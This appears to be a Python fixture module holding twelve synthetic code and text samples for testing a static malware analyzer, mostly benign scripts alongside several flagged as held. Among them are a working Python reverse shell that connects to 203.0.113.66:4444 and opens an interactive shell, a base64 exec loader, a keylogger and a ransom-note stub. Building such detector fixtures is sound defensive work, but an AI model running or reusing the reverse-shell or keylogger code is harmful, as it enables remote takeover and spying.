"""Synthetic payload descriptors - the chamber's study set.

A payload here is a DESCRIPTOR: a name, a kind, and content text.
No real malware, no binaries - text a static analyzer can read.
8 are study-allowed, 4 trip critical markers and are HELD.
"""

from __future__ import annotations

SAMPLES = [
    {"name": "hello-script", "kind": "python",
     "content": "print('hello from the lab')\n"},
    {"name": "app-config", "kind": "json",
     "content": '{"theme": "dark", "retries": 3, "endpoint": "https://api.example.com/v1"}\n'},
    {"name": "release-notes", "kind": "text",
     "content": "Version 2.0: fixed the export bug, improved startup time.\n"},
    {"name": "auto-updater", "kind": "python",
     "content": "import urllib.request\n"
                "urllib.request.urlretrieve('https://updates.example.com/app.bin', '/tmp/app.bin')\n"},
    {"name": "backup-tool", "kind": "shell",
     "content": "#!/bin/sh\ntar -czf /backups/home.tgz /home/user\n"
                "echo '0 3 * * * /opt/backup.sh' | crontab -\n"},
    {"name": "sysinfo-collector", "kind": "python",
     "content": "import os, urllib.request\n"
                "data = os.uname()._asdict()\n"
                "urllib.request.urlopen('https://telemetry.example.com/report', str(data).encode())\n"},
    {"name": "image-resizer", "kind": "python",
     "content": "from PIL import Image\nim = Image.open('in.png')\nim.thumbnail((256, 256))\nim.save('out.png')\n"},
    {"name": "log-cleaner", "kind": "shell",
     "content": "#!/bin/sh\nrm -f /tmp/*.log /var/tmp/*.tmp\n"},
    {"name": "eval-loader", "kind": "python",
     "content": "import base64\nexec(base64.b64decode('cHJpbnQoMSk='))\n"},
    {"name": "reverse-shell", "kind": "python",
     "content": "import socket, subprocess\ns = socket.socket()\ns.connect(('203.0.113.66', 4444))\n"
                "subprocess.call(['/bin/sh', '-i'], stdin=s.fileno())\n"},
    {"name": "key-listener", "kind": "python",
     "content": "from pynput.keyboard import Listener\n"
                "def on_press(k): print(k)\nListener(on_press=on_press).join()\n"},
    {"name": "ransom-note", "kind": "text",
     "content": "Your files have been encrypted. Pay 0.5 BTC to wallet "
                "bc1qexample000000000000000000000000000 to recover them. "
                "encrypt_all('/home/user')\n"},
]


def by_name(name: str) -> dict:
    for sample in SAMPLES:
        if sample["name"] == name:
            return sample
    raise KeyError(name)
